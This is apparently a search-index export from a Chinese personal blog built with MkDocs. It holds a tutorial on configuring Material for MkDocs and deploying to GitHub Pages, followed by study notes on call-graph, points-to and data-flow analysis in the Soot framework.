\u4f5c\u4e3a\u6846\u67b6\uff0c\u4f46\u7531\u4e8e\u590d\u6742\u7684\u5f00\u53d1\u65b9\u5f0f\uff0c\u540e\u9762\u5c31\u6ca1\u52a8\u529b\u66f4\u65b0\u4e86\u3002</p> <p>\u4e3a\u4e86\u6574\u6d01\u65b9\u4fbf\uff0c\u4e0d\u9700\u8981\u592a\u591a\u53d8\u52a8\u539f\u59cb Markdown \u6587\u4ef6\u5c31\u4e0a\u4f20\u5230\u7f51\u7ad9\uff0c\u7b14\u8005\u6700\u7ec8\u9009\u62e9\u4e86 MkDocs\u3002</p> <p>\u672c\u6559\u7a0b\u4e2d\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 <code>Material for MkDocs</code> \u8fdb\u884c\u5f00\u53d1\u3002</p> <p>\u6846\u67b6\u4f18\u52a3\u5bf9\u6bd4\u53ef\u53c2\u8003: \u6846\u67b6\u9009\u62e9</p>"},{"location":"other/blog/Github%20Page%20%2B%20Mkdocs/#mkdocs","title":"\u914d\u7f6e mkdocs","text":"\u5b89\u88c5 mkdocs-material<pre><code>pip install mkdocs-material\n</code></pre> \u521b\u5efa\u65b0\u9879\u76ee<pre><code>mkdir my-site &amp;&amp; cd my-site\nmkdocs new .\n</code></pre> \u672c\u5730\u8c03\u8bd5<pre><code>mkdocs serve\n</code></pre> <p>\u6b64\u65f6\uff0c\u4f1a\u81ea\u52a8\u751f\u6210 <code>mkdocs.yaml</code> \u6587\u4ef6\uff0c\u53ea\u9700\u8981\u5728\u5176\u4e2d\u8fdb\u884c\u76f8\u5e94\u914d\u7f6e\u5373\u53ef\u3002</p> <p>Note</p> <p>\u63a8\u8350\u76f4\u63a5\u590d\u5236\u5373\u53ef\uff0c\u5bf9\u7167\u9879\u76ee\u6587\u4ef6\u98df\u7528\u4f53\u9a8c\u66f4\u4f73\uff1aHappyBlog</p> mkdocs.yaml<pre><code>site_name: HappyBlog\nsite_description: \"\u8fd9\u91cc\u662f\u4e50\u4e50\u7684\u4e2a\u4eba\u535a\u5ba2\uff0c\u5e0c\u671b\u4e0e\u4f60\u5171\u540c\u8fdb\u6b65\uff01\"\nsite_url: \"https://leqing.online/\"\nsite_author: \"HappyTsing\"\nrepo_name: \"HappyBlog\"\nrepo_url: \"https://github.com/HappyTsing/HappyBlog\"\nedit_uri: \"https://github.com/HappyTsing/HappyBlog/blob/master/article\"\ncopyright: \"Copyright &amp;copy; 2023 HappyTsing\"\ndocs_dir: \"article\" # \u6e90\u6587\u4ef6\u76ee\u5f55\nsite_dir: \"site_build\" # \u751f\u6210\u9759\u6001\u6587\u4ef6\u76ee\u5f55\uff0c\u611f\u89c9\u6ca1\u5565\u7528\n\n# \u5177\u4f53\u6587\u7ae0\u4f4d\u7f6e\nnav:\n  - Home: index.md\n    # - BlockChain:\n    # - Computer:\n  - Section1:\n      - sub_section1: \"/path/to/file.md\"\n\ntheme:\n  name: material\n  custom_dir: custom # \u81ea\u5b9a\u4e49\u6587\u4ef6\u5939\n  language: zh\n  features:\n    # - announce.dismiss        # \u901a\u77e5\u5173\u95ed\n    - content.action.edit # \u7f16\u8f91\u64cd\u4f5c\n    - content.action.view # \u67e5\u770b\u64cd\u4f5c\n    - content.code.annotate # \u4ee3\u7801\u6ce8\u91ca\n    - content.code.select # \u4ee3\u7801\u6ce8\u91ca\n    - content.code.copy # \u590d\u5236\u4ee3\u7801\n    - content.tabs.link # \u6807\u7b7e\u94fe\u63a5\n    - content.tooltips # \u5de5\u5177\u63d0\u793a\n    # - header.autohide         # \u81ea\u52a8\u9690\u85cf\u5934\u90e8\n    # - navigation.expand       # \u5c55\u5f00\u5bfc\u822a\n    - navigation.indexes # \u5bfc\u822a\u7d22\u5f15\n    - navigation.instant # \u5373\u65f6\u5bfc\u822a\n    # - navigation.prune        # \u5bfc\u822a\u4fee\u526a\n    # - navigation.sections     # \u5bfc\u822a\u8282\n    - navigation.tabs # \u5bfc\u822a\u6807\u7b7e\n    # - navigation.tabs.sticky  # \u56fa\u5b9a\u5bfc\u822a\u6807\u7b7e\n    - navigation.top # \u5bfc\u822a\u9876\u90e8\n    - navigation.footer # \u5bfc\u822a\u5e95\u90e8\n    - navigation.tracking # \u5bfc\u822a\u8ddf\u8e2a\n    - search.highlight # \u641c\u7d22\u9ad8\u4eae\n    - search.share # \u641c\u7d22\u5206\u4eab\n    - search.suggest # \u641c\u7d22\u5efa\u8bae\n    - toc.follow # \u76ee\u5f55\u8ddf\u968f\n    # - toc.integrate           # \u76ee\u5f55\u6574\u5408\n  palette:\n    - scheme: default\n      primary: white\n      # accent: indigo\n      toggle:\n        icon: material/weather-sunny\n        name: Switch to dark mode\n    - scheme: slate\n      primary: grey\n      # accent: indigo\n      toggle:\n        icon: material/weather-night\n        name: Switch to light mode\n  font:\n    text: Noto Sans SC\n    code: Fira Code\n  favicon: img/logo/1.png\n  logo: img/logo/2.png\n  icon:\n    logo: logo\n    repo: fontawesome/brands/github\n    edit: material/file-edit-outline\n\nextra:\n  disqus: \"open\"\n  social:\n    # - icon: fontawesome/brands/twitter\n    #   link: https://twitter.com/xxx\n    - icon: fontawesome/brands/github\n      link: https://github.com/HappyTsing\n    - icon: fontawesome/brands/bilibili\n      link: https://space.bilibili.com/176452398/\n    - icon: fontawesome/solid/paper-plane\n      link: mailto:&lt;wangleqing00@gmail.com&gt; #\u8054\u7cfb\u65b9\u5f0f\n  generator: false\n  analytics:\n    provider: google\n    property: G-JDXN8V33QR\n\n# Plugins\nplugins:\n  - search\n  # - tags # \u6807\u7b7e\u53c2\u89c1: https://squidfunk.github.io/mkdocs-material/setup/setting-up-tags/\n\n# Extensions\nmarkdown_extensions:\n  - abbr\n  - admonition\n  - attr_list\n  - def_list\n  - footnotes\n  - md_in_html\n  - toc:\n      permalink: true # \u56fa\u5b9a\u6807\u9898\u4f4d\u7f6e\u4e3a\u5f53\u524d\u4f4d\u7f6e\n  - pymdownx.arithmatex: # latex\n      generic: true\n  - pymdownx.betterem: # \u4ee3\u7801\u5757\u9ad8\u4eae\n      smart_enable: all\n      # linenums: true # \u663e\u793a\u884c\u53f7\n      # auto_title: true # \u663e\u793a\u7f16\u7a0b\u8bed\u8a00\u540d\u79f0\n  - pymdownx.caret\n  - pymdownx.details\n  # - pymdownx.emoji:\n  #     emoji_index: !!python/name:materialx.emoji.twemoji\n  #     emoji_generator: !!python/name:materialx.emoji.to_svg\n  - pymdownx.highlight:\n      anchor_linenums: true\n      use_pygments: true\n  - pymdownx.inlinehilite\n  - pymdownx.snippets\n  - pymdownx.superfences:\n      custom_fences:\n        - name: mermaid\n          class: mermaid\n          format: !!python/name:pymdownx.superfences.fence_code_format\n  - pymdownx.keys\n  # - pymdownx.magiclink:\n  #     repo_url_shorthand: true\n  #     user: squidfunk\n  #     repo: mkdocs-material\n  - pymdownx.mark\n  - pymdownx.smartsymbols\n  - pymdownx.tabbed:\n      alternate_style: true\n  - pymdownx.tasklist:\n      custom_checkbox: true\n  - pymdownx.tilde\n  - pymdownx.arithmatex:\n      generic: true\n\n# \u81ea\u5b9a\u4e49 js \u6587\u4ef6\nextra_javascript:\n  - js/baidu-analytics.js\n  # \u4e0b\u9762\u4e09\u4e2a\u662f mathjax\u7528\u7684\n  - js/mathjax.js\n  - https://polyfill.io/v3/polyfill.min.js?features=es6\n  - https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js\n</code></pre>"},{"location":"other/blog/Github%20Page%20%2B%20Mkdocs/#github-page","title":"\u914d\u7f6e Github Page","text":"<p>\u4e3a\u4e86\u5b9e\u73b0\u4e0a\u4f20 Github \u65f6\u81ea\u52a8\u90e8\u7f72\u53d1\u5e03\uff0c\u9700\u8981\u914d\u7f6e <code>ci.yaml</code>\uff0c\u5982\u4e0b\uff1a</p> ci.yaml<pre><code>name: ci\non:\n  push:\n    branches:\n      - master\npermissions:\n  contents: write\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - uses: actions/setup-python@v4\n        with:\n          python-version: 3.x\n      - run: echo \"cache_id=$(date --utc '+%V')\" &gt;&gt; $GITHUB_ENV\n      - uses: actions/cache@v3\n        with:\n          key: mkdocs-material-${{ env.cache_id }}\n          path: .cache\n          restore-keys: |\n            mkdocs-material-\n      - run: pip install mkdocs-material\n      - run: mkdocs gh-deploy --force\n</code></pre>"},{"location":"other/blog/Github%20Page%20%2B%20Mkdocs/#giscus","title":"\u96c6\u6210\u8bc4\u8bba giscus","text":"<p>Reference</p> <p>Giscus integration</p>"},{"location":"security/","title":"Security","text":"<p>Abstract</p> <p>\u672c\u7ae0\u8282\u8bb0\u5f55\u5b89\u5168\u76f8\u5173\u7b14\u8bb0\uff0c\u5305\u62ec\u4e8c\u8fdb\u5236\u5b89\u5168\u3001\u8f6f\u4ef6\u5b89\u5168\u5206\u6790\u3001\u7f51\u7edc\u5b89\u5168\u7b49\u3002</p>"},{"location":"security/soot/call-graph-and-points-to-analysis/","title":"Call Graph and Points-To Analysis","text":""},{"location":"security/soot/call-graph-and-points-to-analysis/#call-graph","title":"Call Graph","text":"<p>\u524d\u7f6e\u77e5\u8bc6</p> <p>Call Graph \u662f\u8fc7\u7a0b\u95f4\u5206\u6790\u7684\u5fc5\u8981\u6570\u636e\u7ed3\u6784\uff0c\u5f53\u524d\u6709\u6570\u79cd\u65b9\u6cd5\u6765\u6784\u5efa Call Graph\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>Class Hierarchy Analysis( CHA) \uff1a\u6700\u5feb\uff0c\u4f46\u7cbe\u5ea6\u5dee\u3002</li> <li>Points-To Analysis\uff1a\u6307\u9488\u5206\u6790\uff0c\u6162\uff0c\u4f46\u7cbe\u5ea6\u9ad8\u3002</li> </ul> <p>Call Graph \u662f\u8c03\u7528\u5173\u7cfb\u56fe\uff0c\u5176\u6bcf\u4e00\u4e2a Node \u8868\u793a\u65b9\u6cd5\uff0c\u800c Edge \u8868\u793a\u8c03\u7528\u3002</p> <p>\u5ef6\u7533\u77e5\u8bc6</p> <p>\u5f15\u5165\u8fc7\u7a0b\u95f4\u5206\u6790\u540e\uff0c\u6211\u4eec\u5411 CFG \u4e2d**\u6dfb\u52a0 Call Graph \u76f8\u5e94\u7684\u5143\u7d20**\uff0c\u5f97\u5230\u8fc7\u7a0b\u95f4\u7684\u63a7\u5236\u6d41\u56fe\uff08ICFG\uff09</p> <p>soot \u5b9e\u73b0</p> <p>\u5f53\u4f7f\u7528 <code>-w</code> option \u6765\u5f00\u542f <code>whole program mode</code>\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>getCallGraph()</code>\u65b9\u6cd5\u6765\u4ece\u73af\u5883\u7c7b <code>Scene</code>\u4e2d\u8bbf\u95ee<code>Call Graph</code>\u3002</p> <p>\u5f53\u4ec0\u4e48\u90fd\u4e0d\u8bbe\u7f6e\u65f6\uff0c\u9ed8\u8ba4\u91c7\u7528 <code>CHA</code>\u751f\u6210 Call Graph\u3002</p> <p>\u8c03\u7528\u56fe\u4e2d\u7684\u6bcf\u6761\u8fb9\u90fd\u5305\u542b\u56db\u4e2a\u5143\u7d20\uff1a</p> <ul> <li>source method</li> <li>source statement (if applicable)</li> <li>target method</li> <li>the kind of edge</li> <li>static invocation</li> <li>virtual invocation</li> <li>interface invocation</li> </ul> <p></p> <p>Call Graph \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u6cd5\uff1a</p> <ul> <li>edgesInto(method)\uff1a\u67e5\u8be2\u8fdb\u5165\u65b9\u6cd5\u7684 edge</li> <li>edgesOutOf(method)\uff1a\u67e5\u8be2\u6765\u81ea\u65b9\u6cd5\u7684 edge</li> <li>edgesOutOf(statement)\u67e5\u8be2\u6765\u81ea\u7279\u5b9a statement \u7684 edge\uff0c</li> </ul> <p>Each of these methods return an Iterator over Edge constructs. soot \u63d0\u4f9b\u4e86 three so-called adapters \u6765\u904d\u5386\u8fb9\u7684\u4e0d\u540c\u5143\u7d20\uff1a</p> <ul> <li>Sources\uff1a\u904d\u5386 source method</li> <li>Units\uff1asource statement</li> <li>Targets\uff1atarget method</li> </ul> <p>\u793a\u4f8b\u5982\u4e0b\uff1a</p> <pre><code>public void printPossibleCallers(SootMethod target) {\n        CallGraph cg = Scene.v().getCallGraph();\n        Iterator sources = new Sources(cg.edgesInto(target));\n        while (sources.hasNext()) {\n        SootMethod src = (SootMethod)sources.next();\n        System.out.println(target + \" might be called by \" + src);\n    }\n}\n</code></pre>"},{"location":"security/soot/call-graph-and-points-to-analysis/#points-to-analysis","title":"Points-To Analysis","text":"<p>\u6307\u9488\u5206\u6790\uff0c\u7528\u4e8e\u751f\u6210\u66f4\u7cbe\u786e\u7684 CFG\u3002\u53ef\u4ee5\u5728 soot \u4e2d\u901a\u8fc7\u4e24\u79cd\u6846\u67b6\u6765\u5b9e\u73b0\u6307\u9488\u5206\u6790\uff1a</p> <ul> <li>SPARK</li> <li>Paddle</li> </ul> <p>Soot provides three implementations of the points-to interface: CHA (a dumb version), SPARK and Paddle. The dumb version simply assumes that every variable might point to every other variable which is conservatively sound but not terribly accurate.</p> <pre><code>$ java -cp $SOOT_HOME soot.Main -pl | grep cg\ncg                            Call graph constructor\n    cg.cha                       Builds call graph using Class Hierarchy Analysis\n    cg.spark                     Spark points-to analysis framework\n    cg.paddle                    Paddle points-to analysis framework\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0ccg \u662f\u4e00\u4e2a phase\uff0c\u5b83\u6709\u4e09\u4e2a subphase\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6267\u884c<code>cg.cha</code>\uff0c\u5982\u679c\u60f3\u4f7f\u7528 spark\uff0c\u5219\u9700\u8981\u542f\u7528 <code>cg.spark</code>\u3002</p>"},{"location":"security/soot/call-graph-and-points-to-analysis/#spark","title":"spark","text":"<p>\u901a\u8fc7<code>-p cg.spark on</code>\u6765\u542f\u7528 spark\uff0c\u6b64\u5916\u8fd8\u6709\u4e00\u4e9b\u4f60\u53ef\u80fd\u611f\u5174\u8da3\u7684 options\uff1a</p> <ul> <li>verbose.\u2003(\u8bbe\u5b9a SPARK \u5728\u5206\u6790\u8fc7\u7a0b\u4e2d\uff0c\u6253\u5370\u591a\u79cd\u4fe1\u606f\u3010\u63d0\u793a\u4fe1\u606f\u3011)</li> <li>propagator SPARK.\u2003(\u5305\u542b\u4e24\u4e2a\u4f20\u64ad\u7b97\u6cd5\uff0c\u539f\u751f\u8fed\u4ee3\u7b97\u6cd5\uff0c\u57fa\u4e8e worklist \u7684\u7b97\u6cd5)</li> <li>simple-edges-bidirectional.\u2003(\u5982\u679c\u8bbe\u7f6e\u4e3a\u771f\uff0c\u5219\u6240\u6709\u7684\u8fb9\u90fd\u4e3a\u53cc\u5411\u7684)</li> <li>on-fly-cg.\uff08\u901a\u8fc7\u8bbe\u7f6e\u6b64\u9009\u9879\uff0c\u8fdb\u884c\u66f4\u52a0\u7cbe\u786e\u7684 points-to \u5206\u6790\uff0c\u5f97\u5230\u7cbe\u786e\u7684 call graph\uff09</li> <li>set-impl.\u2003(\u63cf\u8ff0 points-to \u96c6\u5408\u7684\u5b9e\u73b0\u3002\u53ef\u80fd\u7684\u503c\u4e3a hash,bit,hybrid,array,double)</li> <li>double-set-old \u4ee5\u53ca double-set-new.</li> </ul>"},{"location":"security/soot/data-flow-framework/","title":"The Data-Flow Framework","text":"<p>\u524d\u7f6e\u77e5\u8bc6</p> <p>Data Flow Analysis\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1aHow Data Flows on CFG?</p> <p>\u6bcf\u6b21\u8bed\u53e5\u7684\u6267\u884c\uff0c\u5982 Jimple \u4e2d\u7684 stmt \u6267\u884c\uff0c\u90fd\u4f1a\u5c06\u8f93\u5165\u72b6\u6001\u8f6c\u6362\u4e3a\u65b0\u7684\u8f93\u51fa\u72b6\u6001\u3002\u6570\u636e\u6d41\u5206\u6790\u53ef\u4ee5\u5206\u4e3a forward Analysis \u548c backward Analysis \u4e24\u7c7b\u3002</p> <p>\u5728 intra-procedural Analysis \u4e2d\uff0c\u5c06\u4e0d\u5bf9\u65b9\u6cd5\u8c03\u7528\u8fdb\u884c\u7ec6\u81f4\u5206\u6790\u3002</p> <p>\u5728 CFG \u4e2d\uff0c\u7ed3\u70b9\u6709\u901a\u5e38\u4e24\u79cd\uff1a</p> <ul> <li>\u5355\u72ec\u7684\u4e09\u5730\u5740\u7801\uff0c\u4f8b\u5982 Jimple \u5c31\u662f\u4e00\u79cd\u4e09\u5730\u5740\u7801</li> <li>\u57fa\u672c\u5757 Basic Blocks\uff0c\u662f\u4e09\u5730\u5740\u7801\u7684\u96c6\u5408\uff0c\u5b58\u5728\u5355\u8fdb\u5355\u51fa\u7684\u6027\u8d28\u7b49</li> </ul> <p>\u6b64\u5916\uff0cCFG \u4e2d\u5206\u652f meet \u65f6\uff0c\u5904\u7406\u65b9\u6cd5\u6709\u4e24\u79cd\uff1a</p> <ul> <li>may analysis\uff0c\u6b64\u65f6\u91c7\u7528\u5e76\u96c6 \u222a\uff0c\u5373\u53ef\u4ee5\u8bef\u62a5\uff0c\u4f46\u4e0d\u8bb8\u6f0f\u62a5\u3002</li> <li>must analysis\uff0c\u6b64\u65f6\u91c7\u7528\u4ea4\u96c6 \u2229 \uff0c\u5373\u53ef\u4ee5\u6f0f\u62a5\uff0c\u4f46\u4e0d\u8bb8\u8bef\u62a5\u3002</li> </ul> <p>soot \u5b9e\u73b0</p> <p>\u5728 Soot \u4f5c\u8005\u7684\u6587\u6863\u4e2d\uff0c\u5176\u5bf9\u505a\u4e00\u4e2a flow analysis \u5206\u4e3a\u56db\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>Decide what the nature of the analysis is. \u5373\u8003\u8651 forward Analysis or backward Analysis\uff1f\u662f\u5426\u9700\u8981\u8003\u8651\u5206\u652f\u4fe1\u606f\uff1f</li> <li>Decide what is the intended approximation. \u5373\u8003\u8651 may analysis or must analysis\uff1f\u8fd9\u51b3\u5b9a\u4e86\u5728\u7ed3\u70b9 meet \u65f6\uff0c\u9009\u62e9 \u222a or \u2229</li> <li>performing the actual flow. \u672c\u8d28\u4e0a\u662f\u4e3a\u4e2d\u95f4\u8868\u793a\u7684\u6bcf\u4e2a\u8bed\u53e5\u7f16\u5199\u7b49\u5f0f\uff0c\u4f8b\u5982\uff0c\u5982\u4f55\u5904\u7406\u8d4b\u503c\u8bed\u53e5\uff1f</li> <li>entry node and inner nodes \u7684\u521d\u59cb\u72b6\u6001. \u901a\u5e38\u521d\u59cb\u72b6\u6001\u4e3a\u7a7a\u96c6\u6216\u5168\u96c6\u3002\u4f8b\u5982 available exporessions analysis \u4e2d\uff0centry node \u521d\u59cb\u5316\u4e3a\u5168\u96c6(1...1)\uff0cinner nodes \u521d\u59cb\u5316\u4e3a\u7a7a\u96c6(0...0)\u3002</li> </ul>"},{"location":"security/soot/data-flow-framework/#step1-nature-of-the-analysis","title":"Step1: nature of the analysis","text":"<p>Soot \u63d0\u4f9b\u4e86\u4e09\u79cd\u5b9e\u73b0\uff1a</p> <ul> <li>ForwardFlowAnalysis,</li> <li>BackwardFlowAnalysis</li> <li>ForwardBranchedFlowAnalysis.</li> </ul> <p>\u524d\u4e24\u79cd\u7684\u7ed3\u679c\u662f\u4e24\u4e2a Map\uff1a</p> <ul> <li>from nodes to IN sets</li> <li>from nodes to OUT sets</li> </ul> <p>\u6700\u540e\u4e00\u79cd\u8fd8\u6dfb\u52a0\u4e86\u5206\u652f\u4fe1\u606f\uff0c\u56e0\u6b64\u591a\u4e86\u4e00\u4e2a Map\uff1a</p> <ul> <li>from nodes to IN sets,</li> <li>from nodes to fall-through OUT sets</li> <li>from nodes to branch OUT sets.</li> </ul> <p>\u4e0a\u8ff0\u4e09\u79cd\u90fd\u662f\u901a\u8fc7 fixed-point mechanism using a worklist algorithm \u6765\u5b9e\u73b0\u7684\uff0c\u5982\u679c\u4f60\u60f3\u81ea\u5df1\u5b9e\u73b0\uff0c\u53ef\u4ee5\u901a\u8fc7\u7ee7\u627f\u5982\u4e0b\u4e09\u4e2a\u7c7b\uff1aAbstractFlowAnalysis (the top one), FlowAnalysis or BranchedFlowAnalysis.</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff1avery-busy expressions\uff0c\u8be5\u5206\u6790\u662f\u4e3a\u4e86\u627e\u5230\u5fc5\u5b9a\u4f7f\u7528\u7684\u8868\u8fbe\u5f0f\uff0c\u4f8b\u5982\uff1a<code>if(x&gt;y) then a=1;b=2; else a=1;</code>,\u6b64\u65f6<code>a=1</code>\u5c31\u662f very-busy expression\u3002</p> <p>\u4e3a\u4e86\u8fdb\u884c very-busy expressions analysis\uff0c\u9700\u8981\u4f7f\u7528 backward analysis\uff0c\u56e0\u6b64\u6211\u4eec\u7528\u4e8e\u5206\u6790\u7684\u7c7b\u5fc5\u987b\u7ee7\u627f BackwardFlowAnalysis\u3002</p> <p>\u7136\u540e\u4e3a\u4e86\u5229\u7528 soot \u63d0\u4f9b\u7684\u529f\u80fd\uff0c\u9700\u8981\u63d0\u4f9b\u4e00\u4e2a\u5b9e\u73b0\u5982\u4e0b\u529f\u80fd\u7684\u6784\u9020\u51fd\u6570\uff1a</p> <ul> <li>call the super\u2019s constructor</li> <li>invoke the fixed-point mechanism</li> </ul> <p>\u5177\u4f53\u5b9e\u73b0\u5982\u4e0b\uff1a</p> <pre><code>class VeryBusyExpressionAnalysis extends BackwardFlowAnalysis{\n    public VeryBusyExpressionAnalysis(DirectedGraph g) {\n        super(g);\n        doAnalysis();\n    }\n}\n</code></pre>"},{"location":"security/soot/data-flow-framework/#step2-approximation-level","title":"Step2: Approximation level","text":"<p>\u8be5\u6b65\u9aa4\u7528\u4e8e\u51b3\u5b9a\u662f may or must analysis\uff0c\u5176\u5b9e\u5c31\u662f\u51b3\u5b9a\u5728\u7ed3\u70b9\u4ea4\u6c47\u65f6\u4f7f\u7528 \u222a or \u2229\u3002</p> <p>\u4ecd\u65e7\u4ee5 very-busy expressions analysis \u4e3a\u4f8b\uff0c\u5b83\u4f7f\u7528 must analysis\uff0c\u4e5f\u5c31\u662f\u5728\u7ed3\u70b9\u4ea4\u6c47\uff08meet\uff09\u65f6\u4f7f\u7528\u4ea4\u96c6 \u2229\u3002</p> <p>\u5728 soot \u7684\u5b9e\u73b0\u4e2d\uff0c\u901a\u8fc7\u91cd\u5199 <code>merge()</code> \u65b9\u6cd5\uff0c\u6765\u786e\u5b9a meet \u7684\u5904\u7406\u65b9\u6cd5\uff1a</p> <pre><code>class VeryBusyExpressionAnalysis extends BackwardFlowAnalysis{\n    @Override\n    protected void merge(Object in1, Object in2, Object out) {\n        FlowSet inSet1 = (FlowSet)in1,\n        inSet2 = (FlowSet)in2,\n        outSet = (FlowSet)out;\n        inSet1.intersection(inSet2, outSet);\n    }\n    @Override\n    protected void copy(Object source, Object dest) {\n        FlowSet srcSet = (FlowSet)source,\n        destSet = (FlowSet)dest;\n        srcSet.copy(destSet);\n    }\n}\n</code></pre> <p>\u5728\u4e0a\u8ff0\u7684\u4f8b\u5b50\u4e2d\u53ef\u4ee5\u770b\u5230\uff0csoot \u62bd\u8c61\u4e86 lattice element \u7684\u8868\u793a\u65b9\u5f0f\uff0c\u672c\u4f8b\u4e2d\u4f7f\u7528<code>FlowSet</code>\u3002\u56e0\u4e3a\u8fd9\u79cd\u62bd\u8c61\uff0c\u56e0\u6b64\u9700\u8981\u91cd\u5199 <code>copy()</code>\u65b9\u6cd5\uff0c\u7528\u4e8e\u5c06 lattice element \u7684\u5185\u5bb9\u590d\u5236\u7ed9\u53e6\u4e00\u4e2a lattice element\u3002</p>"},{"location":"security/soot/data-flow-framework/#step3-performing-flow","title":"Step3: Performing flow","text":"<p>\u6b64\u5904\u662f\u6570\u636e\u6d41\u5206\u6790\u4e2d\u7684 <code>transfer function</code>\uff0c\u662f\u6838\u5fc3\u90e8\u5206\u3002</p> <p>\u8be5\u9636\u6bb5\u7684\u5904\u7406\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>kill()\uff1a\u5f53\u6d41\u4ece IN \u7ecf\u8fc7 NODE \u5230 OUT \u7684\u65f6\u5019\uff0c\u9700\u8981 kill \u6389\u4e00\u4e9b\u5df2\u7ecf\u65e0\u6548\u7684\u6570\u636e\u3002</li> <li>gen()\uff1a\u9700\u8981\u5411 OUT \u4e2d\u52a0\u5165 NODE \u751f\u6210\u7684\u6570\u636e\u3002</li> </ul> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6700\u7ec8\u7684 OUT[NODE] = gen<sub>NODE</sub> \u222a ( IN[NODE] - kill<sub>NODE</sub> )</p> <pre><code>class VeryBusyExpressionAnalysis extends BackwardFlowAnalysis{\n    @Override\n    protected void flowThrough(Object in, Object node, Object out) {\n        FlowSet inSet = (FlowSet)source,\n        outSet = (FlowSet)dest;\n        Unit u = (Unit)node;\n        kill(inSet, u, outSet);\n        gen(outSet, u);\n    }\n    private void kill(FlowSet inSet, Unit u, FlowSet outSet){ /* \u7528\u6237\u81ea\u5b9a\u4e49\u5b9e\u73b0 */ }\n    private void gen(FlowSet outSet, Unit u) { /* \u7528\u6237\u81ea\u5b9a\u4e49\u5b9e\u73b0 */ }\n}\n</code></pre> <p>\u5176\u4e2d <code>kill()</code>\u548c<code>gen()</code>\u65b9\u6cd5\u9700\u8981\u7528\u6237\u6839\u636e\u5b9e\u9645\u7684\u60c5\u51b5\u5b9e\u73b0\uff0c\u53ef\u4ee5\u53c2\u8003\u793a\u4f8b\u6e90\u4ee3\u7801\u3002</p>"},{"location":"security/soot/data-flow-framework/#step4-initial-state","title":"Step4: Initial state","text":"<p>\u8be5\u6b65\u9aa4\u7528\u4e8e\u5bf9 entry node \u4ee5\u53ca\u5176 inner node \u8fdb\u884c\u521d\u59cb\u5316\uff0c\u5206\u522b\u7531<code>entryInitialFlow</code> \u548c <code>newInitialFlow</code>\u4e24\u4e2a\u65b9\u6cd5\u5b9e\u73b0\uff1a</p> <pre><code>class VeryBusyExpressionAnalysis extends BackwardFlowAnalysis{\n    @Override\n    protected Object entryInitialFlow() {\n        return new ValueArraySparseSet();\n    }\n    @Override\n    protected Object newInitialFlow() {\n        return new ValueArraySparseSet();\n    }\n}\n</code></pre> <p>\u5728 very-busy expressions analysis \u4e2d\uff0centry node \u662f\u6700\u540e\u4e00\u53e5\u8bed\u53e5\uff0c\u5e76\u7528\u7a7a\u96c6\u6765\u521d\u59cb\u5316\u5b83\uff0c\u5176\u4f59\u7684 inner node \u4e5f\u5168\u90e8\u90fd\u521d\u59cb\u5316\u4e3a\u7a7a\u96c6\u3002</p>"},{"location":"security/soot/data-flow-framework/#flowset","title":"FlowSet","text":"<p>FlowSet \u4ee3\u8868\u7740\u4e0e\u63a7\u5236\u6d41\u56fe CFG \u4e2d \u7ed3\u70b9 node \u76f8\u5173\u8054\u7684\u6570\u636e\u96c6\u3002\u5bf9\u4e8e very-busy expressions analysis\uff0ca node\u2019s flow set \u4ee3\u8868 a set of expressions busy at that node.</p> <p>\u6709\u4e24\u79cd FlowSet\uff1a</p> <ul> <li>bounded FlowSet\uff1aA bounded set is one that knows its universe of possible values\uff0c\u5b9e\u73b0\u63a5\u53e3<code>BoundedFlowSet&lt;T&gt;</code></li> <li>unbounded FlowSet\uff1a\u4e0e bounded \u76f8\u53cd\uff0c\u5b9e\u73b0\u63a5\u53e3 <code>FlowSet&lt;T&gt;</code></li> </ul> <p>\u7ee7\u627f\u4e86<code>FlowSet&lt;T&gt;</code>\u7684\u63a5\u53e3\u9700\u8981\u5b9e\u73b0\uff1a</p> <ul> <li>clone()</li> <li>clear()</li> <li>isEmpty()</li> <li>copy(FlowSet dest) // deep copy of this into dest</li> <li>union(FlowSet other, FlowSet dest) // dest &lt;- this \u222a other</li> <li>intersection(FlowSet other, FlowSet dest) // dest &lt;- this \u2229 other</li> <li>difference(FlowSet other, FlowSet dest) // dest &lt;- this - other</li> </ul> <p>In addition, when implementing <code>BoundedFlowSet&lt;T&gt;</code>, it needs to provide methods for producing the set's complement and its topped set (i.e., a lattice element containing all the possible values).</p> <p>soot \u5b9e\u73b0\u4e86\u56db\u79cd FlowSet\uff0c\u5206\u522b\u662f\uff1aArraySparseSet\u3001ArrayPackedSet\u3001ToppedSet \u548c DavaFlowSet</p> <ul> <li> <p>ArraySparseSet is an unbounded flow set. The set is represented as an array of references</p> </li> <li> <p>ArrayPackedSet is a bounded flow set. Requires that the programmer provides a FlowUniverse object.</p> </li> </ul> <p>A FlowUniverse object is simply a wrapper for some sort of collection or array, and it should contain all the possible values that might be put into the set.</p> <ul> <li>ToppedSet wraps another flow set (bounded or not) adding information regarding whether it is the top set (\u22a4) of the lattice.</li> </ul> <p>In our very-busy expressions example, we need to have flow sets containing expressions and as such we want them to be compared for equivalence \u2014 i.e., two different occurrences of <code>a + b</code> will be different instantiations of some class implementing BinopExpr; thus they will never compare equal. To remedy this, we use a modified version of ArraySparseSet, where we have changed the implementation of the contains method as such:</p> <pre><code>public boolean contains(Object obj) {\n    for (int i = 0; i &lt; numElements; i++)\n        if (elements[i] instanceof EquivTo &amp;&amp; ((EquivTo) elements[i]).equivTo(obj))\n            return true;\n        else if (elements[i].equals(obj))\n            return true;\n    return false;\n}\n</code></pre>"},{"location":"security/soot/data-flow-framework/#cfg","title":"CFG","text":"<p>soot \u5728 package <code>soot.toolkits.graph</code>\u4e2d\u63d0\u4f9b\u4e86\u82e5\u5e72\u79cd CFG( Control Flow Graphs )\uff0c\u90fd\u662f\u57fa\u4e8e\u63a5\u53e3 